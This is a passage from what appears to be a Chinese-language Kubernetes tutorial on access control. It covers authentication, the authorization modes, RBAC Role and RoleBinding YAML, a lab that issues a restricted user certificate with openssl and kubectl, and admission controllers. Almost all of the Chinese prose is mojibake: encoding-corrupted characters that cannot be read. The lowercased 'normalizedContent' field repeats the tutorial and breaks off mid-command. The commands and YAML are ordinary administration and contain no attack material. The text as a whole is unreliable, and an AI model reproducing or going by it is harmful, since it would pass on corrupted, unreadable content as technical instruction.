å®¢æ·ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼å¨è¯ä¹¦ä¸­è·å¾æå¡ç«¯çå¬é¥ï¼\n> å®¢æ·ç«¯å©ç¨æå¡å¨ç«¯çå¬é¥è®¤è¯è¯ä¹¦ä¸­çä¿¡æ¯ï¼å¦æä¸è´ï¼åè®¤å¯è¿ä¸ªæå¡å¨\n> 2> å®¢æ·ç«¯åéèªå·±çè¯ä¹¦ç»æå¡å¨ç«¯ï¼æå¡ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼\n> å¨è¯ä¹¦ä¸­è·å¾å®¢æ·ç«¯çå¬é¥ï¼å¹¶ç¨è¯¥å¬é¥è®¤è¯è¯ä¹¦ä¿¡æ¯ï¼ç¡®è®¤å®¢æ·ç«¯æ¯å¦åæ³\n\n3. æå¡å¨ç«¯åå®¢æ·ç«¯è¿è¡éä¿¡\n\n> æå¡å¨ç«¯åå®¢æ·ç«¯ååå¥½å å¯æ¹æ¡åï¼å®¢æ·ç«¯ä¼äº§çä¸ä¸ªéæºçç§é¥å¹¶å å¯ï¼ç¶ååéå°æå¡å¨ç«¯ã\n> æå¡å¨ç«¯æ¥æ¶è¿ä¸ªç§é¥åï¼åæ¹æ¥ä¸æ¥éä¿¡çææåå®¹é½éè¿è¯¥éæºç§é¥å å¯\n\n> æ³¨æ: Kubernetes åè®¸åæ¶éç½®å¤ç§è®¤è¯æ¹å¼ï¼åªè¦å¶ä¸­ä»»æä¸ä¸ªæ¹å¼è®¤è¯éè¿å³å¯\n\n\n# ææç®¡ç\n\nææåçå¨è®¤è¯æåä¹åï¼éè¿è®¤è¯å°±å¯ä»¥ç¥éè¯·æ±ç¨æ·æ¯è°ï¼ ç¶å Kubernetes ä¼æ ¹æ®äºåå®ä¹çææç­ç¥æ¥å³å®ç¨æ·æ¯å¦ææéè®¿é®ï¼è¿ä¸ªè¿ç¨å°±ç§°ä¸ºææã\n\næ¯ä¸ªåéå° ApiServer çè¯·æ±é½å¸¦ä¸äºç¨æ·åèµæºçä¿¡æ¯ï¼æ¯å¦åéè¯·æ±çç¨æ·ãè¯·æ±çè·¯å¾ãè¯·æ±çå¨ä½ç­ï¼ææå°±æ¯æ ¹æ®è¿äºä¿¡æ¯åææç­ç¥è¿è¡æ¯è¾ï¼å¦æç¬¦åç­ç¥ï¼åè®¤ä¸ºææéè¿ï¼å¦åä¼è¿åéè¯¯ã\n\nAPI Server ç®åæ¯æä»¥ä¸å ç§ææç­ç¥ï¼\n\n * AlwaysDenyï¼è¡¨ç¤ºæç»ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * AlwaysAllowï¼åè®¸æ¥æ¶ææè¯·æ±ï¼ç¸å½äºéç¾¤ä¸éè¦æææµç¨ï¼Kubernetes é»è®¤çç­ç¥ï¼\n * ABACï¼åºäºå±æ§çè®¿é®æ§å¶ï¼è¡¨ç¤ºä½¿ç¨ç¨æ·éç½®çææè§åå¯¹ç¨æ·è¯·æ±è¿è¡å¹éåæ§å¶\n * Webhookï¼éè¿è°ç¨å¤é¨ REST æå¡å¯¹ç¨æ·è¿è¡ææ\n * Nodeï¼æ¯ä¸ç§ä¸ç¨æ¨¡å¼ï¼ç¨äºå¯¹ kubelet ååºçè¯·æ±è¿è¡è®¿é®æ§å¶\n * RBACï¼åºäºè§è²çè®¿é®æ§å¶ï¼kubeadm å®è£æ¹å¼ä¸çé»è®¤éé¡¹ï¼\n\nRBAC (Role-Based Access Control) åºäºè§è²çè®¿é®æ§å¶ï¼ä¸»è¦æ¯å¨æè¿°ä¸ä»¶äºæï¼ç»åªäºå¯¹è±¡æäºäºåªäºæé\n\nå¶ä¸­æ¶åå°äºä¸é¢å ä¸ªæ¦å¿µï¼\n\n * å¯¹è±¡ï¼UserãGroupsãServiceAccount\n * è§è²ï¼ä»£è¡¨çä¸ç»å®ä¹å¨èµæºä¸çå¯æä½å¨ä½ (æé) çéå\n * ç»å®ï¼å°å®ä¹å¥½çè§è²è·ç¨æ·ç»å®å¨ä¸èµ·\n\n\n\nRBAC å¼å¥äº 4 ä¸ªé¡¶çº§èµæºå¯¹è±¡ï¼\n\n * RoleãClusterRoleï¼è§è²ï¼ç¨äºæå®ä¸ç»æé\n * RoleBindingãClusterRoleBindingï¼è§è²ç»å®ï¼ç¨äºå°è§è²ï¼æéï¼èµäºç»å¯¹è±¡\n\nRoleãClusterRole\nä¸ä¸ªè§è²å°±æ¯ä¸ç»æéçéåï¼è¿éçæéé½æ¯è®¸å¯å½¢å¼çï¼ç½ååï¼ã\n\n# Roleåªè½å¯¹å½åç©ºé´åçèµæºè¿è¡ææï¼éè¦æå®nameapce\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apiGroups: [""]  # æ¯æçAPIç»åè¡¨,"" ç©ºå­ç¬¦ä¸²ï¼è¡¨ç¤ºæ ¸å¿APIç¾¤\n  resources: ["pods"] # æ¯æçèµæºå¯¹è±¡åè¡¨\n  verbs: ["get", "watch", "list"] # åè®¸çå¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# ClusterRoleå¯ä»¥å¯¹éç¾¤èå´åèµæºãè·¨namespacesçèå´èµæºãéèµæºç±»åè¿è¡ææ\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¦è¯¦ç»è¯´æçæ¯ï¼rules ä¸­çåæ°ï¼\n\n * apiGroups: æ¯æç API ç»åè¡¨\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resourcesï¼æ¯æçèµæºå¯¹è±¡åè¡¨\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbsï¼å¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nRoleBindingãClusterRoleBinding\nè§è²ç»å®ç¨æ¥æä¸ä¸ªè§è²ç»å®å°ä¸ä¸ªç®æ å¯¹è±¡ä¸ï¼ç»å®ç®æ å¯ä»¥æ¯ UserãGroup æè ServiceAccountã\n\n# RoleBindingå¯ä»¥å°åä¸namespaceä¸­çsubjectç»å®å°æä¸ªRoleä¸ï¼åæ­¤subjectå³å·æè¯¥Roleå®ä¹çæé\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: authorization-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# ClusterRoleBindingå¨æ´ä¸ªéç¾¤çº§å«åæænamespaceså°ç¹å®çsubjectä¸ClusterRoleç»å®ï¼æäºæé\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nRoleBinding å¼ç¨ ClusterRole è¿è¡ææ\nRoleBinding å¯ä»¥å¼ç¨ ClusterRoleï¼å¯¹å±äºåä¸å½åç©ºé´å ClusterRole å®ä¹çèµæºä¸»ä½è¿è¡ææã\n\n> ä¸ç§å¾å¸¸ç¨çåæ³å°±æ¯ï¼éç¾¤ç®¡çåä¸ºéç¾¤èå´é¢å®ä¹å¥½ä¸ç»è§è²ï¼ClusterRoleï¼ï¼ç¶åå¨å¤ä¸ªå½åç©ºé´ä¸­éå¤ä½¿ç¨è¿äº ClusterRoleãè¿æ ·å¯ä»¥å¤§å¹æé«ææç®¡çå·¥ä½æçï¼ä¹ä½¿å¾åä¸ªå½åç©ºé´ä¸çåºç¡æ§ææè§åä¸ä½¿ç¨ä½éªä¿æä¸è´ã\n\n# è½ç¶authorization-clusterroleæ¯ä¸ä¸ªéç¾¤è§è²ï¼ä½æ¯å ä¸ºä½¿ç¨äºRoleBinding\n# æä»¥heimaåªè½è¯»ådevå½åç©ºé´ä¸­çèµæº\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå®æï¼åå»ºä¸ä¸ªåªè½ç®¡ç dev ç©ºé´ä¸ Pods èµæºçè´¦å·\n1. åå»ºè´¦å·\n\n# 1) åå»ºè¯ä¹¦\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) ç¨apiserverçè¯ä¹¦å»ç­¾ç½²\n# 2-1) ç­¾åç³è¯·ï¼ç³è¯·çç¨æ·æ¯devman,ç»æ¯devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/CN=devman/O=devgroup"     \n# 2-2) ç­¾ç½²è¯ä¹¦\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out devman.crt -days 3650\n\n# 3) è®¾ç½®éç¾¤ãç¨æ·ãä¸ä¸æä¿¡æ¯\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# æ¥çdevä¸podï¼åç°æ²¡ææé\n[root@k8s-master01 pki]# kubectl get pods -n dev\nError from server (Forbidden): pods is forbidden: User "devman" cannot list resource "pods" in API group "" in the namespace "dev"\n\n# åæ¢å°adminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. åå»º Role å RoleBindingï¼ä¸º devman ç¨æ·ææ\n\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: devman\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: dev-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. åæ¢è´¦æ·ï¼åæ¬¡éªè¯\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# åæ¬¡æ¥ç\n[root@k8s-master01 pki]# kubectl get pods -n dev\nNAME                                 READY   STATUS             RESTARTS   AGE\nnginx-deployment-66cb59b984-8wp2k    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     Running            0          4d1h\n\n# ä¸ºäºä¸å½±ååé¢çå­¦ä¹ ,ååadminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# åå¥æ§å¶\n\néè¿äºåé¢çè®¤è¯åææä¹åï¼è¿éè¦ç»è¿åå¥æ§å¶å¤çéè¿ä¹åï¼apiserver æä¼å¤çè¿ä¸ªè¯·æ±ã\n\nåå¥æ§å¶æ¯ä¸ä¸ªå¯éç½®çæ§å¶å¨åè¡¨ï¼å¯ä»¥éè¿å¨ Api-Server ä¸éè¿å½ä»¤è¡è®¾ç½®éæ©æ§è¡åªäºåå¥æ§å¶å¨ï¼\n\n--admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,\n                      DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds\n\n\n1\n2\n\n\nåªæå½ææçåå¥æ§å¶å¨é½æ£æ¥éè¿ä¹åï¼apiserver ææ§è¡è¯¥è¯·æ±ï¼å¦åè¿åæç»ã\n\nå½åå¯éç½®ç Admission Control åå¥æ§å¶å¦ä¸ï¼\n\n * AlwaysAdmitï¼åè®¸ææè¯·æ±\n * AlwaysDenyï¼ç¦æ­¢ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * AlwaysPullImagesï¼å¨å¯å¨å®¹å¨ä¹åæ»å»ä¸è½½éå\n * DenyExecOnPrivilegedï¼å®ä¼æ¦æªæææ³å¨ Privileged Container ä¸æ§è¡å½ä»¤çè¯·æ±\n * ImagePolicyWebhookï¼è¿ä¸ªæä»¶å°åè®¸åç«¯çä¸ä¸ª Webhook ç¨åºæ¥å®æ admission controller çåè½ã\n * Service Accountï¼å®ç° ServiceAccount å®ç°äºèªå¨å\n * SecurityContextDenyï¼è¿ä¸ªæä»¶å°ä½¿ç¨ SecurityContext ç Pod ä¸­çå®ä¹å¨é¨å¤±æ\n * ResourceQuotaï¼ç¨äºèµæºéé¢ç®¡çç®çï¼è§å¯ææè¯·æ±ï¼ç¡®ä¿å¨ namespace ä¸çéé¢ä¸ä¼è¶æ \n * LimitRangerï¼ç¨äºèµæºéå¶ç®¡çï¼ä½ç¨äº namespace ä¸ï¼ç¡®ä¿å¯¹ Pod è¿è¡èµæºéå¶\n * InitialResourcesï¼ä¸ºæªè®¾ç½®èµæºè¯·æ±ä¸éå¶ç Podï¼æ ¹æ®å¶éåçåå²èµæºçä½¿ç¨æåµè¿è¡è®¾ç½®\n * NamespaceLifecycleï¼å¦æå°è¯å¨ä¸ä¸ªä¸å­å¨ç namespace ä¸­åå»ºèµæºå¯¹è±¡ï¼åè¯¥åå»ºè¯·æ±å°è¢«æç»ãå½å é¤ä¸ä¸ª namespace æ¶ï¼ç³»ç»å°ä¼å é¤è¯¥ namespace ä¸­ææå¯¹è±¡ã\n * DefaultStorageClassï¼ä¸ºäºå®ç°å±äº«å­å¨çå¨æä¾åºï¼ä¸ºæªæå® StorageClass æ PV ç PVC å°è¯å¹éé»è®¤ç StorageClassï¼å°½å¯è½åå°ç¨æ·å¨ç³è¯· PVC æ¶æéäºè§£çåç«¯å­å¨ç»è\n * DefaultTolerationSecondsï¼è¿ä¸ªæä»¶ä¸ºé£äºæ²¡æè®¾ç½® forgiveness tolerations å¹¶å·æ notready:NoExecute å unreachable:NoExecute ä¸¤ç§ taints ç Pod è®¾ç½®é»è®¤ç âå®¹å¿â æ¶é´ï¼ä¸º 5min\n * PodSecurityPolicyï¼è¿ä¸ªæä»¶ç¨äºå¨åå»ºæä¿®æ¹ Pod æ¶å³å®æ¯å¦æ ¹æ® Pod ç security context åå¯ç¨ç PodSecurityPolicy å¯¹ Pod çå®å¨ç­ç¥è¿è¡æ§å¶',normalizedContent:'# è®¿é®æ§å¶æ¦è¿°\n\nkubernetes ä½ä¸ºä¸ä¸ªåå¸å¼éç¾¤çç®¡çå·¥å·ï¼ä¿è¯éç¾¤çå®å¨æ§æ¯å¶ä¸ä¸ªéè¦çä»»å¡ãæè°çå®å¨æ§å¶å®å°±æ¯ä¿è¯å¯¹ kubernetes çåç§å®¢æ·ç«¯è¿è¡è®¤è¯åé´ææä½ã\n\nå®¢æ·ç«¯\nå¨ kubernetes éç¾¤ä¸­ï¼å®¢æ·ç«¯éå¸¸æä¸¤ç±»ï¼\n\n * user accountï¼ä¸è¬æ¯ç¬ç«äº kubernetes ä¹å¤çå¶ä»æå¡ç®¡ççç¨æ·è´¦å·ã\n * service accountï¼kubernetes ç®¡ççè´¦å·ï¼ç¨äºä¸º pod ä¸­çæå¡è¿ç¨å¨è®¿é® kubernetes æ¶æä¾èº«ä»½æ è¯ã\n\n\n\nè®¤è¯ãææä¸åå¥æ§å¶\napiserver æ¯è®¿é®åç®¡çèµæºå¯¹è±¡çå¯ä¸å¥å£ãä»»ä½ä¸ä¸ªè¯·æ±è®¿é® apiserverï¼é½è¦ç»è¿ä¸é¢ä¸ä¸ªæµç¨ï¼\n\n * authenticationï¼è®¤è¯ï¼ï¼èº«ä»½é´å«ï¼åªææ­£ç¡®çè´¦å·æè½å¤éè¿è®¤è¯\n * authorizationï¼ææï¼ï¼ å¤æ­ç¨æ·æ¯å¦ææéå¯¹è®¿é®çèµæºæ§è¡ç¹å®çå¨ä½\n * admission controlï¼åå¥æ§å¶ï¼ï¼ç¨äºè¡¥åæææºå¶ä»¥å®ç°æ´å ç²¾ç»çè®¿é®æ§å¶åè½ã\n\n\n# è®¤è¯ç®¡ç\n\nkubernetes éç¾¤å®å¨çæå³é®ç¹å¨äºå¦ä½è¯å«å¹¶è®¤è¯å®¢æ·ç«¯èº«ä»½ï¼å®æä¾äº 3 ç§å®¢æ·ç«¯èº«ä»½è®¤è¯æ¹å¼ï¼\n\n * http base è®¤è¯ï¼éè¿ç¨æ·å + å¯ç çæ¹å¼è®¤è¯\n\n> è¿ç§è®¤è¯æ¹å¼æ¯æ âç¨æ·åï¼å¯ç â ç¨ base64 ç®æ³è¿è¡ç¼ç åçå­ç¬¦ä¸²æ¾å¨ http è¯·æ±ä¸­ç header authorization åéåéç»æå¡ç«¯ãæå¡ç«¯æ¶å°åè¿è¡è§£ç ï¼è·åç¨æ·ååå¯ç ï¼ç¶åè¿è¡ç¨æ·èº«ä»½è®¤è¯çè¿ç¨ã\n\n * https è¯ä¹¦è®¤è¯ï¼åºäº ca æ ¹è¯ä¹¦ç­¾åçååæ°å­è¯ä¹¦è®¤è¯æ¹å¼\n\n> è¿ç§è®¤è¯æ¹å¼æ¯å®å¨æ§æé«çä¸ç§æ¹å¼ï¼ä½æ¯åæ¶ä¹æ¯æä½èµ·æ¥æéº»ç¦çä¸ç§æ¹å¼ã\n\n\n\nhttps è®¤è¯å¤§ä½åä¸º 3 ä¸ªè¿ç¨ï¼\n1. è¯ä¹¦ç³è¯·åä¸å\n\n> https éä¿¡åæ¹çæå¡å¨å ca æºæç³è¯·è¯ä¹¦ï¼ca æºæä¸åæ ¹è¯ä¹¦ãæå¡ç«¯è¯ä¹¦åç§é¥ç»ç³è¯·è\n\n2. å®¢æ·ç«¯åæå¡ç«¯çååè®¤è¯\n\n> 1> å®¢æ·ç«¯åæå¡å¨ç«¯åèµ·è¯·æ±ï¼æå¡ç«¯ä¸åèªå·±çè¯ä¹¦ç»å®¢æ·ç«¯ï¼\n> å®¢æ·ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼å¨è¯ä¹¦ä¸­è·å¾æå¡ç«¯çå¬é¥ï¼\n> å®¢æ·ç«¯å©ç¨æå¡å¨ç«¯çå¬é¥è®¤è¯è¯ä¹¦ä¸­çä¿¡æ¯ï¼å¦æä¸è´ï¼åè®¤å¯è¿ä¸ªæå¡å¨\n> 2> å®¢æ·ç«¯åéèªå·±çè¯ä¹¦ç»æå¡å¨ç«¯ï¼æå¡ç«¯æ¥æ¶å°è¯ä¹¦åï¼éè¿ç§é¥è§£å¯è¯ä¹¦ï¼\n> å¨è¯ä¹¦ä¸­è·å¾å®¢æ·ç«¯çå¬é¥ï¼å¹¶ç¨è¯¥å¬é¥è®¤è¯è¯ä¹¦ä¿¡æ¯ï¼ç¡®è®¤å®¢æ·ç«¯æ¯å¦åæ³\n\n3. æå¡å¨ç«¯åå®¢æ·ç«¯è¿è¡éä¿¡\n\n> æå¡å¨ç«¯åå®¢æ·ç«¯ååå¥½å å¯æ¹æ¡åï¼å®¢æ·ç«¯ä¼äº§çä¸ä¸ªéæºçç§é¥å¹¶å å¯ï¼ç¶ååéå°æå¡å¨ç«¯ã\n> æå¡å¨ç«¯æ¥æ¶è¿ä¸ªç§é¥åï¼åæ¹æ¥ä¸æ¥éä¿¡çææåå®¹é½éè¿è¯¥éæºç§é¥å å¯\n\n> æ³¨æ: kubernetes åè®¸åæ¶éç½®å¤ç§è®¤è¯æ¹å¼ï¼åªè¦å¶ä¸­ä»»æä¸ä¸ªæ¹å¼è®¤è¯éè¿å³å¯\n\n\n# ææç®¡ç\n\nææåçå¨è®¤è¯æåä¹åï¼éè¿è®¤è¯å°±å¯ä»¥ç¥éè¯·æ±ç¨æ·æ¯è°ï¼ ç¶å kubernetes ä¼æ ¹æ®äºåå®ä¹çææç­ç¥æ¥å³å®ç¨æ·æ¯å¦ææéè®¿é®ï¼è¿ä¸ªè¿ç¨å°±ç§°ä¸ºææã\n\næ¯ä¸ªåéå° apiserver çè¯·æ±é½å¸¦ä¸äºç¨æ·åèµæºçä¿¡æ¯ï¼æ¯å¦åéè¯·æ±çç¨æ·ãè¯·æ±çè·¯å¾ãè¯·æ±çå¨ä½ç­ï¼ææå°±æ¯æ ¹æ®è¿äºä¿¡æ¯åææç­ç¥è¿è¡æ¯è¾ï¼å¦æç¬¦åç­ç¥ï¼åè®¤ä¸ºææéè¿ï¼å¦åä¼è¿åéè¯¯ã\n\napi server ç®åæ¯æä»¥ä¸å ç§ææç­ç¥ï¼\n\n * alwaysdenyï¼è¡¨ç¤ºæç»ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * alwaysallowï¼åè®¸æ¥æ¶ææè¯·æ±ï¼ç¸å½äºéç¾¤ä¸éè¦æææµç¨ï¼kubernetes é»è®¤çç­ç¥ï¼\n * abacï¼åºäºå±æ§çè®¿é®æ§å¶ï¼è¡¨ç¤ºä½¿ç¨ç¨æ·éç½®çææè§åå¯¹ç¨æ·è¯·æ±è¿è¡å¹éåæ§å¶\n * webhookï¼éè¿è°ç¨å¤é¨ rest æå¡å¯¹ç¨æ·è¿è¡ææ\n * nodeï¼æ¯ä¸ç§ä¸ç¨æ¨¡å¼ï¼ç¨äºå¯¹ kubelet ååºçè¯·æ±è¿è¡è®¿é®æ§å¶\n * rbacï¼åºäºè§è²çè®¿é®æ§å¶ï¼kubeadm å®è£æ¹å¼ä¸çé»è®¤éé¡¹ï¼\n\nrbac (role-based access control) åºäºè§è²çè®¿é®æ§å¶ï¼ä¸»è¦æ¯å¨æè¿°ä¸ä»¶äºæï¼ç»åªäºå¯¹è±¡æäºäºåªäºæé\n\nå¶ä¸­æ¶åå°äºä¸é¢å ä¸ªæ¦å¿µï¼\n\n * å¯¹è±¡ï¼userãgroupsãserviceaccount\n * è§è²ï¼ä»£è¡¨çä¸ç»å®ä¹å¨èµæºä¸çå¯æä½å¨ä½ (æé) çéå\n * ç»å®ï¼å°å®ä¹å¥½çè§è²è·ç¨æ·ç»å®å¨ä¸èµ·\n\n\n\nrbac å¼å¥äº 4 ä¸ªé¡¶çº§èµæºå¯¹è±¡ï¼\n\n * roleãclusterroleï¼è§è²ï¼ç¨äºæå®ä¸ç»æé\n * rolebindingãclusterrolebindingï¼è§è²ç»å®ï¼ç¨äºå°è§è²ï¼æéï¼èµäºç»å¯¹è±¡\n\nroleãclusterrole\nä¸ä¸ªè§è²å°±æ¯ä¸ç»æéçéåï¼è¿éçæéé½æ¯è®¸å¯å½¢å¼çï¼ç½ååï¼ã\n\n# roleåªè½å¯¹å½åç©ºé´åçèµæºè¿è¡ææï¼éè¦æå®nameapce\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apigroups: [""]  # æ¯æçapiç»åè¡¨,"" ç©ºå­ç¬¦ä¸²ï¼è¡¨ç¤ºæ ¸å¿apiç¾¤\n  resources: ["pods"] # æ¯æçèµæºå¯¹è±¡åè¡¨\n  verbs: ["get", "watch", "list"] # åè®¸çå¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# clusterroleå¯ä»¥å¯¹éç¾¤èå´åèµæºãè·¨namespacesçèå´èµæºãéèµæºç±»åè¿è¡ææ\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¦è¯¦ç»è¯´æçæ¯ï¼rules ä¸­çåæ°ï¼\n\n * apigroups: æ¯æç api ç»åè¡¨\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resourcesï¼æ¯æçèµæºå¯¹è±¡åè¡¨\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbsï¼å¯¹èµæºå¯¹è±¡çæä½æ¹æ³åè¡¨\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nrolebindingãclusterrolebinding\nè§è²ç»å®ç¨æ¥æä¸ä¸ªè§è²ç»å®å°ä¸ä¸ªç®æ å¯¹è±¡ä¸ï¼ç»å®ç®æ å¯ä»¥æ¯ userãgroup æè serviceaccountã\n\n# rolebindingå¯ä»¥å°åä¸namespaceä¸­çsubjectç»å®å°æä¸ªroleä¸ï¼åæ­¤subjectå³å·æè¯¥roleå®ä¹çæé\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: authorization-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# clusterrolebindingå¨æ´ä¸ªéç¾¤çº§å«åæænamespaceså°ç¹å®çsubjectä¸clusterroleç»å®ï¼æäºæé\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nrolebinding å¼ç¨ clusterrole è¿è¡ææ\nrolebinding å¯ä»¥å¼ç¨ clusterroleï¼å¯¹å±äºåä¸å½åç©ºé´å clusterrole å®ä¹çèµæºä¸»ä½è¿è¡ææã\n\n> ä¸ç§å¾å¸¸ç¨çåæ³å°±æ¯ï¼éç¾¤ç®¡çåä¸ºéç¾¤èå´é¢å®ä¹å¥½ä¸ç»è§è²ï¼clusterroleï¼ï¼ç¶åå¨å¤ä¸ªå½åç©ºé´ä¸­éå¤ä½¿ç¨è¿äº clusterroleãè¿æ ·å¯ä»¥å¤§å¹æé«ææç®¡çå·¥ä½æçï¼ä¹ä½¿å¾åä¸ªå½åç©ºé´ä¸çåºç¡æ§ææè§åä¸ä½¿ç¨ä½éªä¿æä¸è´ã\n\n# è½ç¶authorization-clusterroleæ¯ä¸ä¸ªéç¾¤è§è²ï¼ä½æ¯å ä¸ºä½¿ç¨äºrolebinding\n# æä»¥heimaåªè½è¯»ådevå½åç©ºé´ä¸­çèµæº\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå®æï¼åå»ºä¸ä¸ªåªè½ç®¡ç dev ç©ºé´ä¸ pods èµæºçè´¦å·\n1. åå»ºè´¦å·\n\n# 1) åå»ºè¯ä¹¦\n[root@k8s-master01 pki]# cd 